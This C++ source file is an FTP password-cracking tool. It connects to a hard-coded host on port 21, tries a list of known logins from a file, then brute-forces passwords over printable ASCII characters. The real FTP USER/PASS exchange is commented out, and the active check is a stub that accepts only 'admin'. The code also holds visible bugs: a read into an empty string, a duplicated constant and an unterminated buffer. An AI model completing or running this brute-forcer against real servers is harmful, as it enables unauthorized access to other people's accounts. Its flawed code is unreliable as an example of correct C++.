#define F_CRY "FTP_CRY"

#include<iostream>
#include<iomanip>
#include<fstream>
#include<unistd.h>
#include<signal.h>
#include <curl/curl.h>

//#define ENABLE_LOG
#include "clog.h"
#include "network_utils.h"
#include "init.h"
using namespace std;

void print(string str){
    cout << str << endl;
}

void print(string str, int servfd){
    write(servfd, str.c_str(), str.size());
}

string scan(int servfd){
    string buf;
    read(servfd, &buf[0], buf.size());
    return buf;
}

bool checkCode(const char *msg, const char *code){
    if(msg[0] == code[0] &&
       msg[1] == code[1] &&
       msg[2] == code[2])
        return true;
    return false;
}

/*
bool authenticate(int servfd, string user, string pass){
    log_inf(F_CRY, "submitting username");
    print("user " + user, servfd);
    
    if(!checkCode(scan(servfd).c_str(), "331")){
        log_err(F_CRY, "protocol mismatch");
        return false;
    }
    log_inf(F_CRY, "submitting password");
    print("pass " + pass, servfd);
    
    if(!checkCode(scan(servfd).c_str(), "230")){
        log_err(F_CRY, "credentials failed");
        return false;
    }
    log_inf(F_CRY, "credentials accepted");
    return true;
}
 */

int auth_cnt = 0;
bool authenticate(int servfd, string user, string pass){
    if(pass == "admin"){
        cout << "password found: " << pass << " | tries: "<< auth_cnt << endl;
        return true;
    }
    auth_cnt++;
    return false;
}

int tryKnown(int servfd){
    ifstream in("login.txt");
    if(!in){
        print("file 'login.txt' not found");
        return -1;
    }
    string user;
    string pass;
    while (!in.eof()) {
        in >> user;
        in >> pass;
        if(authenticate(servfd, user, pass)){
            log_inf(F_CRY, "combination %s and %s worked", user.c_str(), pass.c_str());
            return 0;
        }
        log_err(F_CRY, "combination %s and %s failed", user.c_str(), pass.c_str());
    }
    return -1;
}

#define MIN_USER_CHARS 3
#define MAX_USER_CHARS 8

#define MIN_PASS_CHARS 3
#define MAX_USER_CHARS 8

char *pass;
int _initial = 0;
int _pas_r = 0;
pthread_t bruteThread;
int bruteText(int count, int servfd){
    if(count == _initial){
        pass = (char *)malloc(count); //TODO
    }
    if(count == 0)return -1;
    for(int charset = 32; charset < 127; charset++){
        pass[_initial - count] = charset;
        bruteText(count - 1, servfd);
        if(authenticate(servfd, "admin", pass)){
            exit(EXIT_SUCCESS);
        }
        cout << setw(_pas_r) << setfill('a') << pass << '\r';
    }
    return -1;
}

/* TODO implement thread semaphores for bufferd cacking
 */
int bruteforceLogin(int servfd, int user_range[2], int pass_range[2]){
    //for(int usr_r = user_range[0]; usr_r < user_range[1]; usr_r++){
        for(_pas_r = pass_range[0]; _pas_r < pass_range[1]; _pas_r++){
            //authenticate***
            _initial = _pas_r;
            if(bruteText(_pas_r, servfd) == 0){
                cout << "Current set with range: " << _pas_r << " passed with pass " << pass << endl;
                return 0;
            }
            cout << "Current set with range: " << _pas_r << " failed" << endl;
        }
    //}
    return -1;
}

#define RHOST "192.168.1.1"
#define RPORT 21

void exit_handler(int sig){
    cout << endl << "saving results for later use..." << endl;
    exit(sig);
}

int main(int argc, char *argv[]){
    init();
    signal(SIGINT, exit_handler);
    
    int servfd = -1;
    if((servfd = connect_server(RHOST, RPORT)) < 0 ){
        print("Cannot connect to the server");
        return -1;
    }
    cout << "Connected to the server: " << RHOST << endl;
    
    print("guessing logins");
    if(tryKnown(servfd) == 0){
        print("guessed login correctly");
        return 0;
    }
    print("cannot guess login");
    
    int user_range[] = {MIN_USER_CHARS, MAX_USER_CHARS};
    int pass_range[] = {MIN_PASS_CHARS, MAX_USER_CHARS};
    print("Bruteforcing login with default settings...this may take some time [~days]");
    if(bruteforceLogin(servfd, user_range, pass_range) < 0){
        print("cannot bruteforce login");
    }
	return 0;
}
